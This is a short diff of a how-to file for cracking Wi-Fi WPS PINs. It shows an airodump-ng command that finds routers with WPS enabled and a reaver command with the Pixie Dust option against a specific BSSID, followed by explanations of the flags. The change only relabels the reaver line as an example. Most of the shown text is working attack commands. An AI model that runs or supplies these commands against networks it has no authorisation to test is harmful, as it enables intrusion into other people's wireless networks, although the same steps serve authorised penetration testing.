@@ -3,7 +3,8 @@
 2) run "airodump-ng wlan0mon --wps"
 This will allow you to see who is using wps
 
-3) reaver -i wlan0mon -b A4:2B:8C:AC:68:86 -c 1 -f -a -w -vv -K 1
+3) 
+EX: reaver -i wlan0mon -b A4:2B:8C:AC:68:86 -c 1 -f -a -w -vv -K 1
 -i is the interface you will be using
 -b is the bssid
 -c is the channel you are on
